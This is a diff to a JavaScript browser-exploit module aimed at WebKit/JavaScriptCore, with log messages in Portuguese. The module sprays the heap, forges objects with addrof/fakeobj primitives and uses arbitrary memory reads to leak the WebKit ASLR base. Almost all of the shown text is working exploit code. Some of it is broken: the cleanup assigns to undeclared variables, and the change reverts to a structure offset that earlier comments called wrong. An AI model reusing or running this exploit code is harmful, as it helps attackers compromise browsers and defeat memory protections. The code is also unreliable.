@@ -27,7 +27,8 @@ import {
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs'; // JSC_OFFSETS will be passed as argument, so this import is kept only for WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R60_REAL_ASLR_LEAK_JSFUNCTION_EVAL_ZERO";
+// Renaming the constant to reflect the ongoing issue with zeroed pointers
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R60_ASLR_LEAK_ZERO_PTR_ISSUE";
 
 // Define pause constants locally as they are used with pauseFn.
 const LOCAL_SHORT_PAUSE = 50;
@@ -59,16 +60,16 @@ let global_spray_objects = [];
 
 // NEW: Small local sprays declared globally in the module scope
 let local_distraction_spray = [];
-const DISTRACTION_SPRAY_COUNT = 200; // Increased distraction spray
+const DISTRACTION_SPRAY_COUNT = 100;
 
-// Declare these at module level so they are accessible in finally
-let pre_typed_array_spray_global_ref = [];
-let post_typed_array_spray_global_ref = [];
+let pre_typed_array_spray = []; // Declared in module scope
+let post_typed_array_spray = []; // Declared in module scope
 
 function performDistractionSpray() {
     for (let i = 0; i < DISTRACTION_SPRAY_COUNT; i++) {
         local_distraction_spray.push({}); // Simple empty objects
     }
+    // Periodically clear a portion to prevent excessive memory usage, allowing some GC
     if (local_distraction_spray.length > DISTRACTION_SPRAY_COUNT * 2) {
         local_distraction_spray = local_distraction_spray.slice(DISTRACTION_SPRAY_COUNT);
     }
@@ -95,10 +96,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
         const sprayStartTime = performance.now();
-        const SPRAY_COUNT = 250000; // Increased to 250,000 objects
+        const SPRAY_COUNT = 200000; // Increased to 200,000
         logFn(`Iniciando spray de objetos (volume aumentado para ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < SPRAY_COUNT; i++) {
-            const dataSize = 50 + (i % 20); // More variability
+            const dataSize = 50 + (i % 20); // More variation in size
             global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
         }
         logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
@@ -156,13 +157,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 logFn(`[fakeobj] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn");
             } else {
                 try {
-                    // Aggressive check: Attempt to read a property that exists only on valid JS objects
-                    // This can crash if the faked object is not what's expected or points to invalid memory
-                    const test_prop = obj.constructor; // Common property that should exist for most objects
-                    logFn(`[fakeobj] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj}, test_prop: ${test_prop})`, "debug");
+                    const typeof_faked_obj = typeof obj;
+                    if (typeof_faked_obj === 'number' || typeof_faked_obj === 'boolean' || typeof_faked_obj === 'string') {
+                         logFn(`[fakeobj] ALERTA: Objeto forjado para ${addr.toString(true)} não é um tipo de objeto (recebido: ${typeof_faked_obj}). Pode ser uma corrupção.`, "warn");
+                    } else {
+                         logFn(`[fakeobj] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj})`, "debug");
+                    }
                 } catch (e) {
-                    logFn(`[fakeobj] ALERTA CRÍTICO: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}. Objeto pode ser inválido ou corrompido.`, "warn");
-                    // Depending on severity, you might want to throw here, but for now, just warn.
+                    logFn(`[fakeobj] ALERTA: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}`, "warn");
                 }
             }
             return obj;
@@ -234,14 +236,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Iniciando vazamento REAL da base ASLR da WebKit através de Uint8Array (esperado mais estável)...", "info");
 
         // 1. Criar um Uint8Array como alvo de vazamento.
-        // Sprays em torno do TypedArray principal (referências globais do módulo)
-        for (let i = 0; i < 200; i++) { // Increased pre/post spray to 200
-            pre_typed_array_spray_global_ref.push(new ArrayBuffer(128 + (i % 64)));
-        }
+        // Sprays agressivos pré e pós-typed array
+        for (let i = 0; i < 200; i++) { pre_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }
         const leak_candidate_typed_array = new Uint8Array(0x1000); // 4096 bytes
-        for (let i = 0; i < 200; i++) { // Increased pre/post spray to 200
-            post_typed_array_spray_global_ref.push(new ArrayBuffer(128 + (i % 64)));
-        }
+        for (let i = 0; i < 200; i++) { post_typed_array_spray.push(new ArrayBuffer(256 + (i % 128))); }
 
         logFn(`Objeto Uint8Array criado para vazamento de ClassInfo: ${leak_candidate_typed_array}`, "debug");
 
@@ -255,10 +253,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 3. Ler o ponteiro para a Structure* do Uint8Array (ArrayBufferView)
-        // CRITICAL CHANGE: Use JSCell.STRUCTURE_POINTER_OFFSET (0x8) instead of STRUCTURE_ID_OFFSET (0x0)
-        // The 0x0 offset is for the CellType bitfield, not the actual Structure pointer.
-        const TYPED_ARRAY_DEBUG_RADIUS = 0x80;
-        logFn(`[REAL LEAK] DEBUG: Lendo ${TYPED_ARRAY_DEBUG_RADIUS * 2} bytes ao redor do Uint8Array JSCell (Offset 0x0) para inspeção (buscando Structure* em 0x8)...`, "debug");
+        // Aumentando ainda mais o raio de debug e adicionando mais logs condicionais
+        const TYPED_ARRAY_DEBUG_RADIUS = 0x100; // Inspect 256 bytes around.
+        logFn(`[REAL LEAK] DEBUG: Lendo ${TYPED_ARRAY_DEBUG_RADIUS * 2} bytes ao redor do Uint8Array JSCell (0x0) para inspeção da Structure...`, "debug");
         for (let i = -TYPED_ARRAY_DEBUG_RADIUS; i <= TYPED_ARRAY_DEBUG_RADIUS; i += 8) {
             const current_debug_address = typed_array_addr.add(i);
             try {
@@ -267,17 +264,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 if (debug_value.equals(AdvancedInt64.Zero)) {
                     debug_status = " (ZEROED)";
                 } else if (debug_value.high() === 0x7ff00000 && debug_value.low() < 0x1000) {
-                    debug_status = " (POSS. SMALL INT)";
+                    debug_status = " (POSS. SMALL INT/BAD PTR)";
                 } else if (!debug_value.equals(AdvancedInt64.Zero) && !debug_value.equals(AdvancedInt64.NaNValue)) {
-                    // Heuristic: try to interpret as pointer and see if it's an object
-                    try {
-                        const potential_obj = fakeobj_primitive(debug_value);
-                        if ((typeof potential_obj === 'object' || typeof potential_obj === 'function') && potential_obj !== null) {
-                            debug_status = ` (POSS. PTR to ${typeof potential_obj})`;
-                            // For even more agressiveness, try to access a property here (e.g., potential_obj.length or potential_obj.byteLength)
-                            // But be aware this can lead to crashes if it's not a real object.
-                        }
-                    } catch (e_deref) { /* ignore */ }
+                    // Heuristic: Check if the value could be a valid pointer (e.g., typically non-zero, non-small-int)
+                    // If it points to an address within a plausible range (e.g., not extremely low/high values)
+                    // This is very platform-specific, but generally, valid pointers are not 0x0 or NaN.
+                    const is_plausible_ptr = debug_value.high() !== 0 && debug_value.high() < 0x7FFF0000; // Exclui endereços muito baixos ou 'NaN'
+                    if (is_plausible_ptr) {
+                        try {
+                            const potential_obj = fakeobj_primitive(debug_value);
+                            if (typeof potential_obj === 'object' || typeof potential_obj === 'function') {
+                                debug_status = ` (POSS. VALID PTR to ${typeof potential_obj})`;
+                            }
+                        } catch (e_deref) { /* ignore error, continue */ }
+                    }
                 }
                 logFn(`[REAL LEAK] DEBUG_MEM: Uint8Array_Base+0x${i.toString(16).padStart(2, '0')}: ${debug_value.toString(true)}${debug_status}`, "debug");
             } catch (e) {
@@ -288,8 +288,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
 
-        // Read the actual Structure pointer at offset 0x8
-        const typed_array_structure_ptr = arb_read_primitive(typed_array_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET)); // Use 0x8
+        const typed_array_structure_ptr = arb_read_primitive(typed_array_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.STRUCTURE_ID_OFFSET)); // This offset is 0x0
         if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
             const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array. Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}. low: 0x${typed_array_structure_ptr?.low().toString(16) || 'N/A'}, high: 0x${typed_array_structure_ptr?.high().toString(16) || 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
             logFn(errorMsg, "critical");
@@ -384,7 +383,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
         } else {
             logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
-            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_C)`
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
         }
         logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
@@ -407,8 +406,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
         // Clear local sprays to assist GC
         local_distraction_spray = [];
-        pre_typed_array_spray_global_ref = []; // Now correctly referencing global arrays
-        post_typed_array_spray_global_ref = []; // Now correctly referencing global arrays
+        pre_typed_array_spray_local_ref = []; // Corrected: Using local ref name
+        post_typed_array_spray_local_ref = []; // Corrected: Using local ref name
 
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         global_spray_objects = [];
